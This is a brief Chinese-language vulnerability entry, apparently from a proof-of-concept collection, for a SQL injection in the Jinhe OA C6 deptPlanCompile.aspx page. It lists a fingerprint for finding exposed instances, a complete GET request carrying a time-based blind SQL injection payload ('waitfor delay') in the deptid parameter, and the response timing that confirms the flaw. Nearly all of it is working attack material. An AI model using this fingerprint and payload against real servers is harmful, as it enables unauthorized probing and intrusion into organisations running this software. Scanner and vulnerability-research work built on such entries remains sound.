# 金和OAC6deptPlanCompileSQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`body="JHSoft.Web.AddMenu"`
- **请求**：`GET /C6/JHSoft.Web.TargetPlan/TargetPlan/deptPlanCompile.aspx/?year=2024&period=1&deptid=11%27;waitfor%20delay%20%270:0:5%27--`
- **响应特征**：200 响应时间>=5s